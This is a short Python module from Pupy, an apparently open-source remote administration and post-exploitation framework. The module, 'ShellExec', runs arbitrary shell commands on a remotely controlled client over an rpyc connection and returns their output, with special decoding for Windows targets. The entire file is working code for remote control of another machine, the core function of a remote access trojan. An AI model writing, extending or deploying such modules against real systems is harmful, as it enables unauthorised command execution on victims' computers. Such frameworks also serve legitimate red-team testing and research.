# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from pupylib.PupyModule import *
import subprocess
from rpyc.utils.helpers import restricted
__class_name__="ShellExec"

class ShellExec(PupyModule):
	""" execute shell commands on a remote system """
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='shell_exec', description=self.__doc__)
		self.arg_parser.add_argument('argument')
	def run(self, args):
		res=""
		try:
			res=self.client.conn.modules.subprocess.check_output(args.argument, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, universal_newlines=True)
		except Exception as e:
			if hasattr(e,'output') and e.output:
				res=e.output
			else:
				res=str(e)
			
		if self.client.is_windows():
			try:
				res=res.decode('cp437')
			except Exception:
				pass
		self.log(res)

